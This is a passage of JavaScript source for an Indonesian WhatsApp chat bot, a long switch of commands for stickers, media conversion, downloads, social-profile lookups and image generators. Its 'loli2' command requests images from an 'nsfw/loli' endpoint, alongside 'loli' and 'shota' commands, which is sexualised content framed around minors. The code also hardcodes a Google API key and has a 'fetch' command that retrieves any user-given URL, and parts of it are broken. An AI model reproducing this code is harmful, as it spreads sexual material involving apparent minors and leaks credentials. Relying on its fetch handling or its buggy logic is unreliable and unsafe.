  return reply(`*ᴋᴀᴍᴜ ʜᴀʀᴜs ʀᴇɢɪsᴛᴇʀ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ!!*\n\n≡ *ᴍᴀɴᴜᴀʟ :*\n.ʀᴇɢɪsᴛᴇʀ ɴᴀᴍᴀ.ᴜᴍᴜʀ\n\n≡ *ᴠᴇʀɪғʏ ᴅᴇɴɢᴀɴ ᴇᴍᴀɪʟ:*\n.ʀᴇɢᴍᴀɪʟ (ᴇᴍᴀɪʟ ᴋᴀᴍᴜ)\n\n📥 *ʙᴜᴋᴀ ᴇᴍᴀɪʟ ᴅᴀɴ ᴄᴇᴋ ᴘᴇsᴀɴ ᴍᴀsᴜᴋ ᴀᴛᴀᴜ ᴅɪ ғᴏʟᴅᴇʀ sᴘᴀᴍ*, sᴇᴛᴇʟᴀʜ ᴋᴀᴍᴜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ sᴇʙᴜᴀʜ ᴋᴏᴅᴇ *ᴠᴇʀɪғɪᴋᴀsɪ* ᴅᴀʀɪ ᴇᴍᴀɪʟ, ᴋᴀᴍᴜ ʙɪsᴀ ᴋɪʀɪᴍᴋᴀɴ ᴋᴇ ʙᴏᴛ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ *.ᴠᴇʀᴄᴏᴅᴇ (codenya)*`);
}

if (!q) {
  return reply('Masukan Text');
}

 let randomColor = ['#FFFFFF'];
    const apiColor = randomColor[Math.floor(Math.random() * randomColor.length)];

    let pp = await conn.profilePictureUrl(m.sender, 'image').catch(_ => 'https://cdn.jsdelivr.net/gh/SazumiVicky/MakeMeow-Storage@main/avatar_contact.png')

const obj = {
      "type": "quote",
      "format": "png",
      "backgroundColor": apiColor,
      "width": 512,
      "height": 768,
      "scale": 2,
      "messages": [{
        "entities": [],
        "avatar": true,
        "from": {
          "id": 1,
          "name": pushname,
          "photo": {
            "url": pp
          }
        },
        "text": text,
        "replyMessage": {}
      }]
    }

    const json = await axios.post('https://quote-api.bokov68872.repl.co/generate', obj, {
      headers: {
        'Content-Type': 'application/json'
      }
    })


// Melakukan permintaan POST dengan Axios
const buffer = Buffer.from(json.data.result.image, 'base64')
    conn.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` }).catch(error => {
    // Tangani kesalahan jika ada
    reply(`Error`);
  });          
            }
            break
            
            case 'qcimg':
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
            const { quote } = require('./lib/quote.js')
            if (!q) return ('Masukan Text')
            let ppnyauser = await await conn.profilePictureUrl(m.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
            const rest = await quote(q, pushname, ppnyauser)
            newReply(mess.wait)
            conn.sendMessage(m.chat, { image: { url: rest.result }, caption: `Done?`}, {quoted: m})
            .catch(console.error)
            break
            
			case 'sticker':
            case 'stiker':
            case 's':{
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
             if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!quoted) return `Balas Video/Image Dengan Caption ${prefix + command}`
                newReply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await conn.sendImageAsSticker(m.chat, media, m, {
                        packname: 'ᴢʀ ʙᴏᴛ ᴍᴀᴅᴇ ʙʏ ᴢᴀᴇɴᴀʀ', 
                        author: `${isRegistered ? `${NamaKamu(m.sender)}` : `${pushname}`}`
                    })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
                    let media = await quoted.download()
                    let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, {
                        packname: 'aʀ ʙᴏᴛ ᴍᴀᴅᴇ ʙʏ arybotz', 
                        author: `${isRegistered ? `${NamaKamu(m.sender)}` : `${pushname}`}`
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return newReply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
            
            case 'smeme': {
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) return newReply(respond)
            if (!text) return newReply(respond)
	        newReply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await conn.downloadAndSaveMediaMessage(qmsg)
	        let fatGans = await TelegraPh(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
	        let FaTiH = await conn.sendImageAsSticker(m.chat, smeme, m, { packname: 'ᴢʀ ʙᴏᴛ ᴍᴀᴅᴇ ʙʏ ᴢᴀᴇɴᴀʀ', author: `${isRegistered ? `${NamaKamu(m.sender)}` : `${pushname}`}` })
	        await fs.unlinkSync(FaTiH)
            }
	        break
	             
            case 'swm': {
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                let [teks1, teks2] = text.split`|`
                if (!teks1) return newReply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
                if (!teks2) return newReply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
            	newReply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await conn.downloadMediaMessage(qmsg)
                    let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
                    let media = await conn.downloadMediaMessage(qmsg)
                    let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else {
                    return newReply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
            
            case 'emojimix': {
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return newReply(`Contoh : ${prefix + command} 😅+🤔`)
                if (!emoji2) return newReply(`Contoh : ${prefix + command} 😅+🤔`)
                newReply(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await conn.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
                
            }
            break
            
            case 'emojimix2': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!text) return newReply(`Contoh : ${prefix + command} 😅`)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
                for (let res of anu.results) {
                    let encmedia = await conn.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
                
            }
            break
            
            case 'attp':
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                try {
                if (args.length == 0) return newReply(`Example: ${prefix + command} Zaky Ganteng`)
                await conn.sendMessage(m.chat, {sticker: {url:`https://api.lolhuman.xyz/api/attp?apikey=${apilol}&text=${full_args}` }}, { quoted: m })
            } catch (e) {
                newReply(mess.error)
            }
            break
            case 'attp2':
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                try {
                    if (args.length == 0) return newReply(`Example: ${prefix + command} Zaky Ganteng`)
                    await conn.sendMessage(m.chat, {sticker: {url:`https://api.lolhuman.xyz/api/attp2?apikey=${apilol}&text=${full_args}` }}, { quoted: m })
                } catch (e) {
                    newReply(mess.error)
            }
            break
            case 'ttp':
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                try {
                    if (args.length == 0) return newReply(`Example: ${prefix + command} Zaky Ganteng`)
                    await conn.sendMessage(m.chat, {sticker: {url:`https://api.lolhuman.xyz/api/ttp?apikey=${apilol}&text=${full_args}` }}, { quoted: m })
                } catch (e) {
                    newReply(mess.error)
            }
            break
            
            case 'toimage': 
            case 'toimg': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!/webp/.test(mime)) return newReply(`Reply sticker dengan caption *${prefix + command}*`)
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    conn.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                
            }
            break
	        case 'tomp4': 
	        case 'tovideo': {
	        if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
	        if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!/webp/.test(mime)) return newReply(`Reply stiker dengan caption *${prefix + command}*`)
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
                
            }
            break
            
            case 'toaud': 
            case 'toaudio': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
            if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
            newReply(mess.wait)
            let media = await conn.downloadMediaMessage(qmsg)
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            
            }
            break
            
            case 'tomp3': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')    
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
            if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
            newReply(mess.wait)
            let media = await conn.downloadMediaMessage(qmsg)
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ArybotzMD.mp3`}, { quoted : m })
            
            }
            break
            
            case 'tovn': 
            case 'toptt': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
            if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
            newReply(mess.wait)
            let media = await conn.downloadMediaMessage(qmsg)
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            
            }
            break
            
            case 'togif': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!/webp/.test(mime)) return newReply(`Reply stiker dengan caption *${prefix + command}*`)
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
                
            }
            break
            
            // GenshinMenu
            case 'enka':
            case 'profilgi': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (args.length == 0) return newReply(`Example: ${prefix + command} 809005073`)
			axios.get(`https://enka.network/api/uid/${args[0]}?info`).then(({ data }) => {
				var caption2 = `▧「 *P R O F I L E  G E N S H I N* 」\n\n*Nickname* : *${data.playerInfo.nickname}*\n`
				caption2 += `*Adventure Rank* : *${data.playerInfo.level}*\n`
				caption2 += `*Signature* : *${data.playerInfo.signature}*\n`
				caption2 += `*World Level* : *${data.playerInfo.worldLevel}*\n\n`
				caption2 += `*Achievement* : *${data.playerInfo.finishAchievementNum}*\n`
				caption2 += `*Abyss* : *Floor ${data.playerInfo.towerFloorIndex} Chamber ${data.playerInfo.towerLevelIndex}*\n\n`
				caption2 += `▧ *Mau Lebih Lengkap? Cek Disini :*\nhttps://enka.network/u/${args[0]}\n`
				newReply(caption2)
			})
			.catch(console.error)
			}
			break
case 'ytv': case 'ytmp4': case 'ytvideo': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!text) return newReply(`Masukan Link Dari Youtube!`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://api.arifzyn.xyz/download/ytmp4?url=${text}`)
const cpt = anu.result.channel
const nick = anu.result.title
let old = new Date()
conn.sendMessage(m.chat, { video: { url: anu.result.result}, caption: `🍄 *Fetching* : ${((new Date - old) * 1)} ms`}, {quoted: m})
}catch (error) {
newReply('*Terjadi Kesalahan.!*') 
}
}
break
case 'ytv2': case 'ytvideo2': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://vihangayt.me/download/ytmp4?url=${text}`)
const cpt = anu.data.duration
const nick = anu.data.title
let old = new Date()
conn.sendMessage(m.chat, { video: { url: anu.data.vid_360p}, caption: `🍄 *Fetching* : ${((new Date - old) * 1)} ms`}, {quoted: m})
}catch (error) {
newReply(`*Terjadi Kesalahan.!*`);
}
}
break
            // Stalk Fitur
            case 'igstalk': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (args.length == 0) return newReply(`Example: ${prefix + command} whyzzxy`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/stalkig/${args[0]}?apikey=${apilol}`).then(({ data }) => {
				var caption9 = `Username : ${data.result.username}\n`
				caption9 += `Full Name : ${data.result.fullname}\n`
				caption9 += `Posts : ${data.result.posts}\n`
				caption9 += `Followers : ${data.result.followers}\n`
				caption9 += `Following : ${data.result.following}\n`
				caption9 += `Bio : ${data.result.bio}`
				conn.sendMessage(m.chat, { image: { url: data.result.photo_profile }, caption9 })
			})
			
			}
			break

            case 'ttstalk': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (args.length == 0) return newReply(`Example: ${prefix + command} dryan.pu`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apilol}`).then(({ data }) => {
				var caption0 = `Username : ${data.result.username}\n`
				caption0 += `Nickname : ${data.result.nickname}\n`
				caption0 += `Followers : ${data.result.followers}\n`
				caption0 += `Followings : ${data.result.followings}\n`
				caption0 += `Likes : ${data.result.likes}\n`
				caption0 += `Video : ${data.result.video}\n`
				caption0 += `Bio : ${data.result.bio}\n`
				conn.sendMessage(m.chat, { image: { url: data.result.user_picture }, caption0 })
			})
			.catch(console.error)
			}
			break
			
			case 'mlstalk':
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (args.length == 0) return newReply(`Example: ${prefix + command} 84830127/2169`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/mobilelegend/${args[0]}?apikey=${apilol}`)
			newReply(data.result)
			.catch(console.error)
			break
			
			case 'ghstalk': {
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (args.length == 0) return newReply(`Example: ${prefix + command} ${global.wm}`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/github/${args[0]}?apikey=${apilol}`).then(({ data }) => {
				var caption11 = `Name : ${data.result.name}\n`
				caption11 += `Link : ${data.result.url}\n`
				caption11 += `Public Repo : ${data.result.public_repos}\n`
				caption11 += `Public Gists : ${data.result.public_gists}\n`
				caption11 += `Followers : ${data.result.followers}\n`
				caption11 += `Following : ${data.result.following}\n`
				caption11 += `Bio : ${data.result.bio}`
				conn.sendMessage(m.chat, { image: { url: data.result.avatar }, caption11 })
			})
			
			}
			break
			
		    case 'twstalk': {
		    if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} jokowi`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/twitter/${args[0]}?apikey=${apilol}`).then(({ data }) => {
				var caption22 = `Username : ${data.result.screen_name}\n`
				caption22 += `Name : ${data.result.name}\n`
				caption22 += `Tweet : ${data.result.tweet}\n`
				caption22 += `Joined : ${data.result.joined}\n`
				caption22 += `Followers : ${data.result.followers}\n`
				caption22 += `Following : ${data.result.following}\n`
				caption22 += `Like : ${data.result.like}\n`
				caption22 += `Description : ${data.result.description}`
				conn.sendMessage(m.chat, { image: { url: data.result.profile_picture }, caption22 })
			})
			.catch(console.error)
			}
			break
			case 'get': case 'fetch': {			
  let _url = new URL(text)
  let res = await fetch(_url)
  if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
    delete res
    throw `Content-Length: ${res.headers.get('content-length')}`
  }
  if (!/text|json/.test(res.headers.get('content-type'))) return conn.sendFile(m.chat, _url, 'file', text, m)
  let txt = await res.buffer()
  try {
    txt = util.format(JSON.parse(txt+''))
  } catch (e) {
    txt = txt + ''
  } finally {
    m.reply(txt.slice(0, 65536) + '')
  }
}
break
case 'getsider': case 'sider': {
const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)


function msToDate(ms) {
  let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
  let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
  let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
  let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
  if (d == 0 && h == 0 && m == 0) {
        return "Baru Saja"
    } else {
        return [d, 'H ', h, 'J '].map(v => v.toString().padStart(2, 0)).join('')
    }
  
}
    var lama = 86400000 * 7
    const now = new Date().toLocaleString("en-US", {
        timeZone: "Asia/Jakarta"
    });
    const milliseconds = new Date(now).getTime();

    let member = groupMetadata.participants.map(v => v.id)
    if (!text) {
        var pesan = "Harap aktif di grup karena akan ada pembersihan member setiap saat"
    } else {
        var pesan = text
    }
    var sum
    sum = member.length
    var total = 0
    var sider = []
    for (let i = 0; i < sum; i++) {
        let users = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
        if ((typeof global.db.data.users[member[i]] == 'undefined' || milliseconds * 1 - global.db.data.users[member[i]].lastseen > lama) && !isAdmins) {
            if (typeof global.db.data.users[member[i]] !== 'undefined') {
                if (global.db.data.users[member[i]].banned == true) {
                    total++
                    sider.push(member[i])
                }
            } else {
                total++
                sider.push(member[i])
            }
        }
    }
    if (total < 1) return reply(`*Digrup ini tidak terdapat sider.*`)
    conn.sendMessage(m.chat, { text: `*${total}/${sum}* anggota grup adalah sider dengan alasan :\n1. Tidak aktif selama lebih dari 7 hari\n2. Baru join tetapi tidak pernah berinteraksi\n\n_“${pesan}”_\n\n*LIST SIDER :*\n${sider.map(v => '  ○ ' + v.replace(/@.+/, '' + typeof global.db.data.users[v] == "undefined" ? ' Sider ' : ' Off ' + msToDate(milliseconds * 1 - global.db.data.users[v].lastseen))).join('\n')}`}, {
        contextInfo: {
            mentionedJid: sider
        }
    })
}
break			


			case 'ssweb': {
	const api = require('api-dylux');
	if (!text) {
		throw '*Example*: .ssweb https://goggle.com';
	}
	conn.sendMessage(m.chat, {
		react: {
			text: '🕒',
			key: m.key,
		}
	})

	try {
		let response = await api.ssweb(text);
		if (response.includes('Error: ')) {
			throw response;
		}
		conn.sendFile(m.chat, response, 'screenshot.jpg', '', m);
	} catch (error) {
		console.log(error);
		m.reply(`Terjadi Kesalahan Saat Mengscreensoot Web: ${error}`);
	}
}
            break
            
		    case 'darkjoke':
		    if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
		    if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${apilol}`}, caption: `Done?`}, {quoted: m})
            break
            
			case 'memeindo':
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme/memeindo?apikey=${apilol}`}, caption: `Done?`}, {quoted: m})
            break
			
			// Nsfw Menu
			case 'ahegao':
			case 'yuri':
			case 'cum':
			case 'ero':
			case 'manga':
			case 'hentai':
			case 'blowjob':
			case 'panties':
			case 'pussy':
			case 'neko':
			case 'femdom':
			case 'bdsm': {
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			    if (!isPremium) return newReply(mess.prem)
                if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${apilol}`}, caption: `🥵 Wangy Banget Kan?`})
        }
        
        break
			case 'milf':
			case 'feets':
			case 'armpits':
			case 'ecchi': {
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			    if (!isPremium) return newReply(mess.prem)
				if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `http://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${apilol}`}, caption: `🥵 Wangy Banget Kan?`})
		    }
	        break
	        case 'loli2': {
	        if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			    if (!isPremium) return newReply(mess.prem)
				if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/loli?apikey=${apilol}`}, caption: `🐶`})
		    }
	        break
			case 'lewd': {
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			    if (!isPremium) return newReply(mess.prem)
				if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `http://api.lolhuman.xyz/api/random/nsfw/waifu?apikey=${apilol}`}, caption: `🥵 Wangy Banget Kan?`})
		    }
	        break
			case 'tits':
			case 'cum_jpg':
			case 'lewdk': {
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			    if (!isPremium) return newReply(mess.prem)
				if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `http://api.lolhuman.xyz/api/random2/${command}?apikey=${apilol}`}, caption: `🥵 Wangy Banget Kan?`})
		    }
	        break
			
			// Ramdon Foto
	        case 'waifu':
	        case 'waifu2': {
	        if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
	        if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
				if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/waifu?apikey=${apilol}`}, caption: `Random image for ${command}`})
		    }
	        break

	        case 'cosplay': {
	        if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
	        if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
				if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=${apilol}`}, caption: `Random image for ${command}`})
		    }
	        break

            case 'art':
            case 'loli':
            case 'shota':
            case 'shinobu':
            case 'husbu':
            case 'wallnime': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
				if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 5
				newReply(mess.wait)
				conn.sendMessage(m.chat, { image: { url: `http://api.lolhuman.xyz/api/random/${command}?apikey=${apilol}`}, caption: `Random image for ${command}`})
		    }
	        break
	        
	        // Creator Image
	        case 'bucinsertifikat':
		    case 'sertifikatbucin':
			case 'bucincert':
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
				if (args.length == 0) return newReply(`Example: ${prefix + command} Aris Kentod`)
				newReply(mess.wait)
				kueri = args.join(" ")
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/bucinserti?apikey=${apilol}&name=${kueri}`}, caption: 'Sertifikatnya kack'}, {quoted: m})
            break
            
			case 'tololsert':
			case 'tololcert':
			case 'tololsertifikat':
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} Aris Kentod`)
			newReply(mess.wait)
			ytta = args.join(" ")
            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/toloserti?apikey=${apilol}&name=${ytta}`}, caption: 'Sertifikatnya kack'}, {quoted: m})
            break
            
			case 'pacarsertifikat':
			case 'pacarcert':
		if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
            if (args.length == 0) return newReply(`Usage: ${prefix + command} nama1|nama2`)
            newReply(mess.wait)
                get_args = args.join(" ").split("|")
                nik = get_args[0]
                prov = get_args[1]
			    titidnya = `Selamat yaa ${nik} ❤️ ${prov}`
            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/pacarserti?apikey=${apilol}&name1=${nik}&name2=${prov}`}, caption: titidnya}, {quoted: m})
            break
	        
	        case 'carbon':
	        if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
	        if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
	            if (!q) return newReply(`Example: ${prefix + command} const zky = require('zkyskyapi')`)
	            newReply(mess.wait)
	            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/carbon?apikey=${apilol}&code=${q}&language=nodejs`}, caption: `Created By ary-md\n\n\nCode:\n\n${q}`}, {quoted: m})
	        break
	     
	    // Ephoto1
	    case 'wetglass':
		case 'multicolor3d':
		case 'watercolor':
		case 'luxurygold':
		case 'galaxywallpaper':
		case 'lighttext':
		case 'beautifulflower':
		case 'puppycute':
		case 'royaltext':
		case 'heartshaped':
		case 'birthdaycake':
		case 'galaxystyle':
		case 'hologram3d':
		case 'greenneon':
		case 'glossychrome':
		case 'greenbush':
		case 'metallogo':
		case 'noeltext':
		case 'glittergold':
		case 'textcake':
		case 'starsnight':
